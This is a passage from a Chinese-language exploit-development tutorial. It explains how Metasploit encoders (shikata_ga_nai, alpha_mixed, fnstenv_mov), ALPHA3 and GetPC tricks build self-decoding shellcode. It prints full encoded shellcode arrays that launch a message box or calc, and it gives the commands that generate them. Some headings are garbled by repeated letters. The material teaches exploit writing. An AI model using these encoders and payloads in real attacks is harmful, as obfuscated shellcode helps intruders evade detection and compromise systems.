一个。（所以FLDPI也可以工作）
POPEBX：解码器的第一个指令的指令放到EBX中（从栈中弹出）
前面的这些指令的目标是：“得到解码器的起始地址然后放到EBX中”（GetPC--看后面），
并且“将ECX设为14”。
接下来，我们看这个：
ADD EBX，4：EBX加4
XORDWORDPTRDS：[EBX+15],EDI：用EBX+15和EDI进行XOR操作，并把结果
写入EBX+15。当这个指令第一次执行时，一个LOOPD指令会被重新结合。
ADDEDI，DWORDPTRDS：[EBX+15]：EDI加上前面指令在EBX+15处重新结合后
的字节
好的，这开始有意义了。解码器的第一条指令用来得到解码器的第一天指令的地址，然
后定义了需要跳转回去的循环。这就解释了为什么循环指令自身不是解码器指令的一部分
（因为在它写入LOOPD指令前它需要决定自己的地址），但是要和第一条XOR操作重新
结合。
从这往前看，一个循环被初始化，并且结果写入到EBX+15（重复过程中EBX每次加4）。
所以循环第一次执行时，在EBX加上4后，EBX+15指向循环之类的下面（因此解码器能
用EBX（+15）作为跟踪写入解码/原始shellcode的地址的寄存器）。正如上面所显示的，
解码循环包含下面这些指令：
ADDEBX,4
XORDWORDPTRDS:[EBX+15],EDI
ADDEDI,DWORDPTRDS:[EBX+15]
此外，XOR操作将会产生原始的字节并将结果写入EBX+15。接下来，结果加到EDI上（下
一次循环中用来XOR下一些字节）...
ECX寄存器用来记录shellcode的位置（递减）。当ECX到达1时，原始的shellcode就会产
生在循环的下面，因此跳转（LOOPD）就不会被执行，原始的代码就会被执行（因为就在
循环的后面）
好的，往回看Metasploit中编码器的描述：
PolymorphicXORAdditiveFeedbackEncoder
我们知道XOR和Additive词的来源...但是Polymorphic?
好的，每次当你运行编码器时，有些东西变了
放到ESI中的值变了
得到解码器起始地址的指令的位置变了
用来记录位置的寄存器（上面的例子是EBX，下面屏幕截图中的是EDX）变了。
本质上，循环前面的指令顺序变了，变量的值也变了（寄存器，ESI的值）。
这可以确认的是，每次你产生的编码版本的payload，大部分字节会不一样（没有改变解码
器的大体理念），这个是payload变得多态，难以检测。
XXXX88886666////aaaallllpppphhhhaaaa____mmmmiiiixxxxeeeedddd
用这个编码器编码我们的那个msgboxshellcode时产生了一个218字节的编码过的
shellcode：
./msfencode-ex86/alpha_mixed-b'\x00'-i/pentest/exploits/shellcode.bin-tc
[*]x86/alpha_mixedsucceededwithsize218(iteration=1)
unsignedcharbuf[]=
"\x89\xe3\xda\xc3\xd9\x73\xf4\x58\x50\x59\x49\x49\x49\x49\x49"
"\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x37\x51\x5a\x6a"
"\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32"
"\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
"\x43\x58\x42\x4c\x45\x31\x42\x4e\x45\x50\x42\x48\x50\x43\x42"
"\x4f\x51\x62\x51\x75\x4b\x39\x48\x63\x42\x48\x45\x31\x50\x6e"
"\x47\x50\x45\x50\x45\x38\x50\x6f\x43\x42\x43\x55\x50\x6c\x51"
"\x78\x43\x52\x51\x69\x51\x30\x43\x73\x42\x48\x50\x6e\x45\x35"
"\x50\x64\x51\x30\x45\x38\x42\x4e\x45\x70\x44\x30\x50\x77\x50"
"\x68\x51\x30\x51\x72\x43\x55\x50\x65\x42\x48\x45\x38\x45\x31"
"\x43\x46\x42\x45\x50\x68\x42\x79\x50\x6f\x44\x35\x51\x30\x4d"
"\x59\x48\x61\x45\x61\x4b\x70\x42\x70\x46\x33\x46\x31\x42\x70"
"\x46\x30\x4d\x6e\x4a\x4a\x43\x37\x51\x55\x43\x4e\x4b\x4f\x4b"
"\x56\x46\x51\x4f\x30\x50\x50\x4d\x68\x46\x72\x4a\x6b\x4f\x71"
"\x43\x4c\x4b\x4f\x4d\x30\x41\x41";
从输出中我们可以发现，shellcode的大部分是字母数字字符组（我们只在代码的开头处看到
一对不是字母数字字符组）
这个编码器的主要思想是重新产生原始代码（通过一个循环），通过在这些字母数字字符组
做确定的操作--很像shikata_ga_nai所做的那样，但是用一种不同的（限制的）指令集和操
作。
XXXX88886666////ffffnnnnsssstttteeeennnnvvvv____mmmmoooovvvv
虽然是另一种编码器，但它也会产生一些跟其他的编码过的shellcode一样的构建模块：
getpc(看后面）
重新产生原始的代码（以某种方法--技术视每个编码器/解码器而定）
跳转到重新产生的代码处，然后运行
例子：执行“calc”shellcode，通过fnstenv_mov编码
编码后的shellcode是这样的：
"\x6a\x33\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x48"
"\x9d\xfb\x3b\x83\xeb\xfc\xe2\xf4\xb4\x75\x72\x3b\x48\x9d"
"\x9b\xb2\xad\xac\x29\x5f\xc3\xcf\xcb\xb0\x1a\x91\x70\x69"
"\x5c\x16\x89\x13\x47\x2a\xb1\x1d\x79\x62\xca\xfb\xe4\xa1"
"\x9a\x47\x4a\xb1\xdb\xfa\x87\x90\xfa\xfc\xaa\x6d\xa9\x6c"
"\xc3\xcf\xeb\xb0\x0a\xa1\xfa\xeb\xc3\xdd\x83\xbe\x88\xe9"
"\xb1\x3a\x98\xcd\x70\x73\x50\x16\xa3\x1b\x49\x4e\x18\x07"
"\x01\x16\xcf\xb0\x49\x4b\xca\xc4\x79\x5d\x57\xfa\x87\x90"
"\xfa\xfc\x70\x7d\x8e\xcf\x4b\xe0\x03\x00\x35\xb9\x8e\xd9"
"\x10\x16\xa3\x1f\x49\x4e\x9d\xb0\x44\xd6\x70\x63\x54\x9c"
"\x28\xb0\x4c\x16\xfa\xeb\xc1\xd9\xdf\x1f\x13\xc6\x9a\x62"
"\x12\xcc\x04\xdb\x10\xc2\xa1\xb0\x5a\x76\x7d\x66\x22\x9c"
"\x76\xbe\xf1\x9d\xfb\x3b\x18\xf5\xca\xb0\x27\x1a\x04\xee"
"\xf3\x6d\x4e\x99\x1e\xf5\x5d\xae\xf5\x00\x04\xee\x74\x9b"
"\x87\x31\xc8\x66\x1b\x4e\x4d\x26\xbc\x28\x3a\xf2\x91\x3b"
"\x1b\x62\x2e\x58\x29\xf1\x98\x15\x2d\xe5\x9e\x3b\x42\x9d"
"\xfb\x3b";
当在调试器中看这个代码时，我们看到这个：
PUSH33+POPECX=将33放到ECX中。这个值将会被用来当做产生原始shellcode循环
的计数器。
FLDZ+FSTENV：用来得到在内存中的位置（跟shikata_ga_nai中用的很像）
POPEBX：当前地址（前两个指令的结果）被放到EBX中
XORDWORDPTRDS:[EBX+13],3BFB9D48：在EBX偏移13地址处的数据进行XOR
操作。EBX在前面的指令中已经初始化过了。这将会产生4字节的原始shellcode。当第一
次运行这个XOR操作时，MOVAH，75指令（在0x00402196）被变成“CLD”
SUBEBX，-4（从EBX中减去-4，下一次就能写入下一个4字节）
LOOPDSHORT：跳转回XOR操作，然后ECX减一，直到ECX不是0
这个循环将会有效地重新产生shellcode。当ECX=0时（当所有的代码都已经被重新产生），
我们可以看代码（用MOV操作+XOR来得到我们要的值）：
首先，一个到0x00402225的跳转被调用（shellcode的主函数），我们可以看到一个指向
“calc.exe”的指针被入栈，然后WinExec被定位并执行。
暂时不要担心shellcode是怎么工作的（“定位winexec”，等等）--你会在下一章中学到。
花点时间看下那不同的编码器所产生的并且解码循环是怎么工作的。这些知识是基本的当你
要调节代码。
编码器：sssskkkkyyyylllliiiinnnneeeeddddaaaallllpppphhhhaaaa3333
Skylined最近发布了thealpha3encodingutility（alpha2的改进版本，在unicode教程中讨
论过了）。Alpha3将会产生100%的字母数字代码，并提供了其他的一些功能，能够使写
shellcode/构造exploit更方便。当然值得看一下！
小例子：我们假设你已经写了没有编码的shellcode到calc.bin，现在你可以用这个命令
将它转换为兼容latin-1的shellcode：
ALPHA3.cmdx86latin-1call--input=calc.bin>calclatin.bin
然后转化为字节码：
perlpveReadbin.plcalclatin.bin
Readingcalclatin.bin
Read405bytes
"\xe8\xff\xff\xff\xff\xc3\x59\x68"
"\x66\x66\x66\x66\x6b\x34\x64\x69"
"\x46\x6b\x44\x71\x6c\x30\x32\x44"
"\x71\x6d\x30\x44\x31\x43\x75\x45"
"\x45\x35\x6c\x33\x4e\x33\x67\x33"
"\x7a\x32\x5a\x32\x77\x34\x53\x30"
"\x6e\x32\x4c\x31\x33\x34\x5a\x31"
"\x33\x34\x6c\x34\x47\x30\x63\x30"
"\x54\x33\x75\x30\x31\x33\x57\x30"
"\x71\x37\x6f\x35\x4f\x32\x7a\x32"
"\x45\x30\x63\x30\x6a\x33\x77\x30"
"\x32\x32\x77\x30\x6e\x33\x78\x30"
"\x36\x33\x4f\x30\x73\x30\x65\x30"
"\x6e\x34\x78\x33\x61\x37\x6f\x33"
"\x38\x34\x4f\x35\x4d\x30\x61\x30"
"\x67\x33\x56\x33\x49\x33\x6b\x33"
"\x61\x37\x6c\x32\x41\x30\x72\x32"
"\x41\x38\x6b\x33\x48\x30\x66\x32"
"\x41\x32\x43\x32\x43\x34\x48\x33"
"\x73\x31\x36\x32\x73\x30\x58\x32"
"\x70\x30\x6e\x31\x6b\x30\x61\x30"
"\x55\x32\x6b\x30\x55\x32\x6d\x30"
"\x53\x32\x6f\x30\x58\x37\x4b\x34"
"\x7a\x34\x47\x31\x36\x33\x36\x35"
"\x4b\x30\x76\x37\x6c\x32\x6e\x30"
"\x64\x37\x4b\x38\x4f\x34\x71\x30"
"\x68\x37\x6f\x30\x6b\x32\x6c\x31"
"\x6b\x30\x37\x38\x6b\x34\x49\x31"
"\x70\x30\x33\x33\x58\x35\x4f\x31"
"\x33\x34\x48\x30\x61\x34\x4d\x33"
"\x72\x32\x41\x34\x73\x31\x37\x32"
"\x77\x30\x6c\x35\x4b\x32\x43\x32"
"\x6e\x33\x5a\x30\x66\x30\x46\x30"
"\x4a\x30\x42\x33\x4e\x33\x53\x30"
"\x79\x30\x6b\x34\x7a\x30\x6c\x32"
"\x72\x30\x72\x33\x4b\x35\x4b\x31"
"\x35\x30\x39\x35\x4b\x30\x5a\x34"
"\x7a\x30\x6a\x33\x4e\x30\x50\x38"
"\x4f\x30\x64\x33\x62\x34\x57\x35"
"\x6c\x33\x41\x33\x62\x32\x79\x32"
"\x5a\x34\x52\x33\x6d\x30\x62\x30"
"\x31\x35\x6f\x33\x4e\x34\x7a\x38"
"\x4b\x34\x45\x38\x4b\x31\x4c\x30"
"\x4d\x32\x72\x37\x4b\x30\x43\x38"
"\x6b\x33\x50\x30\x6a\x30\x52\x30"
"\x36\x34\x47\x30\x54\x33\x75\x37"
"\x6c\x32\x4f\x35\x4c\x32\x71\x32"
"\x44\x30\x4e\x33\x4f\x33\x6a\x30"
"\x34\x33\x73\x30\x36\x34\x47\x34"
"\x79\x32\x4f\x32\x76\x30\x70\x30"
"\x50\x33\x38\x30\x30";
编码器：编写自己的编码器
我只能贡献一套关于用和写编码器（现在有点超出范围）的文档。你可以用这个卓越的
uninformed文章，skape写的，关于怎样实现一个自定义的x86编码器。
找到你自己的：GGGGeeeettttPPPPcccc
当我们在复习skikata_ga_nai和fstenv_mov时你集中精力的话，你应该会好奇为什么需
要/用指令的第一条（用来获得代码在内存中的当前位置）。这个思想是解码器必须要在一个
寄存器里有绝对基址（payload的开头/编码器的开头），因此解码器是这样的：
在内存中完全的重定位（因此它可以找到自己的位置无论它在内存中的位置是哪里）
能够通过解码器代码的基地址+偏移量来参照解码器，或者编码过的shellcode的顶
部，或者shellcode中的一个函数...而不是要跳转到一个包含有null字节的字节码地址。
这种技术通常叫做“GetPc”或者“GetProgramCounter”，并且有很多gettingPC的方法：
CCCCAAAALLLLLLLL$$$$++++5555
通过运行CALL$+5，紧跟着一个POP寄存器，你将会把POP指令的位置的绝对地址放
到寄存器中。唯一的一个我们要注意的问题是这个代码包含null字节，因此在很多情况下
它不可用。
CCCCAAAALLLLLLLLllllaaaabbbbeeeellll++++ppppoooopppp（ffffoooorrrrwwwwaaaarrrrddddccccaaaallllllll）
CALLgeteip
geteip:
popeax
这将会将popeax在内存中的绝对地址放到eax中。相同的这个字节码也包含null字节，因
此在很多情况下它不可用。
CCCCAAAALLLLLLLL$$$$++++4444
这个用在ALPHA3解码的例子中（看上面）的技术，它的描述在：
http://skypher.com/wiki/index.php/Hacking/Shellcode/GetPC
3条指令被用来获得下面的shellcode能够用到的绝对地址
CALL$+4
RET
POPECX
\xe8\xff\xff\xff\xff:call+4